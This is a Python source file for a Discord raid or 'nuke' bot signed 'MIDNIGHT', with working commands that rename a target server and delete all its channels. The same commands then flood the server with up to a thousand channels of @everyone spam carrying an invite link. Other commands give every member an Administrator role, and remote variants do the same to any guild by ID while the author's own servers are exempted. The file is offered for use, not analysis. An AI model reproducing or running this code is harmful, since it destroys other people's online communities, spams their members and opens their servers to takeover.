import discord
from discord.ext import commands,tasks
import asyncio
from time import sleep




intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

BANNED_GUILDS = {1368366058955866263,1371952159284920413,1215488574514794556,}

BOT_SERVER_ID = 1371952159284920413
REQUIRED_ROLE_ID = 1371952210207834193





message = """@everyone YOUR SERVER JUST GOT NUKED BY MIDNIGHT L BOZO
https://discord.gg/wYzVccJvxp
"""




@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')



@bot.command()
async def nuke(ctx):
    if ctx.guild and ctx.guild.id in BANNED_GUILDS:
        await ctx.send("This command is not available in this server.")
        return
        
    await ctx.send("Type `CONFIRM` to nuke the server.")

    def check(m):
        return (
            m.author == ctx.author and
            m.channel == ctx.channel and
            m.content.strip().upper() == "CONFIRM"
        )

    try:
        msg = await bot.wait_for("message", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("⏰ Confirmation timed out.")
        return

    await ctx.send("Nuking...")
    sleep(1)
    guild = ctx.guild

    try:
        # Rename the server and update the icon
        await guild.edit(name="NUKED BY MIDNIGHT")
    except Exception as e:
        print(f"Failed to rename server: {e}")


    # Delete all channels concurrently
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # Create new channels and send message concurrently
    async def create_and_message(index):
        channel = await guild.create_text_channel(f'{index+1}-get-clowned-by-midnight')
        for i in range(10):   # Message Amount
            await channel.send(message)
            print(f'Sent Message {index+1}')

    create_tasks = [create_and_message(i) for i in range(20)]   # Channel Amount
    await asyncio.gather(*create_tasks)

    await ctx.send("Done!")


@bot.command()
async def adminall(ctx):
    if ctx.guild and ctx.guild.id in BANNED_GUILDS:
        await ctx.send("This command is not available in this server.")
        return

    guild = ctx.guild

    # Create Administrator role
    try:
        admin_perms = discord.Permissions(administrator=True)
        role = await guild.create_role(name="ADMINISTRATOR", permissions=admin_perms)
        await ctx.send("Administrator role created.")
    except Exception as e:
        await ctx.send(f"Failed to create role: {e}")
        return

    # Assign role to all members
    await ctx.send("giving everyone administrator lol")
    for member in guild.members:
        try:
            await member.add_roles(role)
        except Exception as e:
            print(f"Failed to assign role to {member.name}: {e}")

        await ctx.send("just gave everyone administrator lol")



@bot.command(name="remoteadminall")
async def remoteadminall(ctx, guild_id: int):
    if guild_id in BANNED_GUILDS:
        await ctx.send("This command is not available in that server.")
        return

    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("Bot not available in that guild.")
        return

    try:
        admin_perms = discord.Permissions(administrator=True)
        role = await guild.create_role(name="ADMINISTRATOR", permissions=admin_perms)
        await ctx.send(f"✅ Administrator role created in **{guild.name}**.")
    except Exception as e:
        await ctx.send(f"Failed to create admin role: {e}")
        return

    await ctx.send("Assigning admin role to all members...")

    for member in guild.members:
        try:
            await member.add_roles(role)
            await asyncio.sleep(0.5)  # prevent rate limiting
        except Exception as e:
            print(f"❌ Failed to assign role to {member.name}: {e}")

    await ctx.send("✅ Everyone has been given administrator (if possible).")





@bot.command(name="remotenuke")
async def remotenuke(ctx, guild_id: int):

    if guild_id in BANNED_GUILDS:
        await ctx.send("This command is not available in that server.")
        return

    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("Bot not available in that guild.")
        return

    await ctx.send(f"Type `CONFIRM` to nuke **{guild.name}**.")

    def check(m):
        return (
            m.author == ctx.author and
            m.channel == ctx.channel and
            m.content.strip().upper() == "CONFIRM"
        )

    try:
        msg = await bot.wait_for("message", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("⏰ Confirmation timed out.")
        return

    await ctx.send("Nuking...")

    try:
        await guild.edit(name="NUKED BY MIDNIGHT")
    except Exception as e:
        print(f"Failed to rename server: {e}")

    try:
        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
    except Exception as e:
        print(f"Failed to delete channels: {e}")

    async def create_and_message(index):
        try:
            channel = await guild.create_text_channel("GET NUKED")
            for i in range(100):  # Messages per channel
                await channel.send(message)
                print(f"Sent message {index+1}")
        except Exception as e:
            print(f"Failed in create_and_message: {e}")

    create_tasks = [create_and_message(i) for i in range(1000)]  # Number of channels
    await asyncio.gather(*create_tasks)

    print("✅ Done.")







bot.run('')

